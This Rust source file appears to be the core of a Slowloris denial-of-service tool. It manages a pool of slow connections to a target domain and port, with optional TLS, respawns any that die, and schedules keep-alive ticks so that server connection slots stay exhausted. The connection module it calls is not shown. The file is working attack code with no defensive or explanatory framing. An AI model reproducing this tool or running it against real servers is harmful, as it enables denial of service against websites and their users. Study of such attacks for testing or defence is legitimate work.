use crate::loris::Loris;
use std::time::{Duration, Instant};

pub struct SlowLoris {
    domain: String,
    port: String,
    use_tls: bool,
    interval: Duration,
    loris: Vec<Option<Loris>>,
}

impl SlowLoris {
    pub fn new(
        domain: String,
        port: String,
        use_tls: bool,
        interval: Duration,
        max_connections: usize,
    ) -> Self {
        SlowLoris {
            use_tls,
            domain,
            port,
            interval,
            loris: (0..max_connections).map(|_| None).collect(),
        }
    }

    pub fn get_alive(self: &Self) -> usize {
        self.loris
            .iter()
            .filter(|loris| loris.as_ref().is_some_and(|x| x.is_alive()))
            .count()
    }

    pub fn get_dead(self: &Self) -> usize {
        self.loris
            .iter()
            .filter(|loris| loris.as_ref().is_none_or(|x| x.is_dead()))
            .count()
    }

    pub fn tick(self: &mut Self) -> Instant {
        let tick_time = Instant::now();

        for i in 0..self.loris.len() {
            match &mut self.loris[i] {
                None => {
                    self.loris[i] = Some(Loris::spawn(
                        &self.domain,
                        &self.port,
                        self.use_tls,
                        self.interval,
                    ))
                }
                Some(loris) => {
                    // Tick and then evict if died
                    loris.tick(tick_time);

                    if loris.is_dead() {
                        self.loris[i] = None;
                    }
                }
            };
        }

        // determine next best time to tick
        self.loris
            .iter()
            .map(|loris| match loris {
                None => tick_time,
                Some(loris) => loris.get_next_tick_time(),
            })
            .min()
            .unwrap_or(tick_time)
    }
}
